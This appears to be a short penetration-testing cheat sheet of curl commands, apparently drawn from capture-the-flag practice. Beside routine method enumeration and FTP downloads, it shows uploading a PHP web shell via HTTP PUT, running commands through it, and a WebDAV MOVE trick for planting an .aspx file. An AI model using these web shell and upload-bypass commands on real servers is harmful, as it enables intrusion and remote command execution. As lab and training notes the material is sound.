# Curl

#### Enumerate HTTP methods 
```bash
 # curl -v -X OPTIONS http://172.168.1.10/test

 -v : Used for debugging
 -X : Specifies a custom request method
```

#### Upload a php file 
```bash
 # curl -v -X PUT -d "<?php phpinfo();?>" http://172.168.1.10/test/test.php

 -d : Sends the specified data in a POST request to the HTTP Server

 Upload file and then test that it is there
 # curl -X PUT http://xx.xx.xx.xx/df.txt -d @cmdasp.aspx
 - Uploading an aspx file when it is not allowed via the put command 
 
 # curl -X PUT http://xx.xx.xx.xx/df.txt -d @test.txt 
 Ref: http://0xdf.gitlab.io/2019/03/06/htb-granny.html 
 - The -d @text.txt syntax says that the data for the request should be the contents of the file text.txt
 
 # curl http://xx.xx.xx.xx
```

#### Upload a PHP shell file
```bash
 # curl -X PUT -d '<?php system($_GET["cmd"]);' http://172.168.1.10/test/cmd.php

 # To run the file

 # curl "http://172.168.1.10/test/cmd.php?cmd=ls%20-lha"
```

#### Download files from FTP server
```bash
 # curl -u ftpuser:ftppass -O ftp://ftp_server/public_html/users.txt

 -u : Specifies the username and password
 -O : Saves output to local director
```

#### To access an https site unsecurely
 ```bash
 # curl -k, --insecure 
 
 -k : Process the url insecurely and ignore ssl errors
 ```
 
#### Using the MOVE method via curl
```bash
 # curl -X MOVE -H 'Destination:http://xx.xx.xx.xx/Oxdf.aspx' http://xx.xx.xx.xx/0xdf.txt 
 
 -H : <header/@file> Pass custom header(s) to server 
```
